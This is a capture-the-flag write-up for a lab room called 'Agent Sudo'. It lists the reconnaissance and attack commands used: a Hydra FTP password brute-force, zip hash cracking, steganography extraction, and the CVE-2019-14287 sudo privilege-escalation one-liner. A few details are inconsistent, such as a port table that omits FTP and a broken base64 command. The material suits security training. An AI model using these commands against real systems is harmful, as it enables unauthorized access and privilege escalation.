## General Information
- Room: Agent Sudo
- Difficulty: Easy
- Date: 16/11/2023
- Description: "You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth." 


## Methodology
- Used Nmap for service identification.
- Explored HTTP using Curl.
- Executed Hydra for FTP brute-force.
- Analyzed FTP using the FTP client.
- Employed BinWalk to inspect cutie.png.
- Cracked a password hash using John.
- Decoded a Base64 string.
- Extracted hidden data using Steghide.
- Established SSH connection, copied files via SCP.
- Exploited CVE-2019-14287 for privilege escalation.


## Results

### Reconnaissance
- IP:10.10.188.244  
- Port Scan results:

| PORT   | STATE | SERVICE    | VERSION                                |
|--------|-------|------------|----------------------------------------|
| 22/tcp | open  | ssh        | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) |
| 80/tcp | open  | http       | Apache httpd 2.4.18 (Ubuntu)            |

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

### Tools and Exploitation

#### Nmap Scan
~~~nmap
nmap -sV -oN nmap_scan.txt 10.10.188.244
~~~

#### Curl
~~~curl
curl "http://10.10.188.244/" -H "User-Agent: C" -L
~~~

#### Hydra FTP Brute-force
~~~hydra
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.188.244 
~~~

#### FTP
~~~ftp
ftp 10.10.188.244   
~~~

#### BinWalk
~~~binwalk
binwalk cutie.png 
binwalk -e cutie.png 
~~~


#### John the Ripper
~~~ jhon | zip2john
zip2john 8702.zip > hash.txt 
john hash.txt 
~~~

#### Base64
~~~ base64
echo 'QXJlYTUx' | base 64 -d
~~~

#### Base64
~~~ steghide
steghide extract -sf cute-alien.jpg 
~~~

#### SSH
~~~ ssh
ssh james@10.10.188.244
sudo scp james@10.10.188.244:Alien_autospy.jpg ./
~~~

#### Privilege Escalation (CVE-2019-14287)
~~~  CVE-2019-14287
sudo -u#-1 /bin/bash 
~~~

### Exploited Vulnerabilities
- FTP Brute-force: Successfully gained access to the FTP server by cracking the password for the user 'chris' using Hydra.
- Steganography: Discovered hidden data in the image cute-alien.jpg using Steghide, revealing additional information.
- Privilege Escalation (CVE-2019-14287): Exploited the sudo vulnerability to escalate privileges and gain elevated access to the system.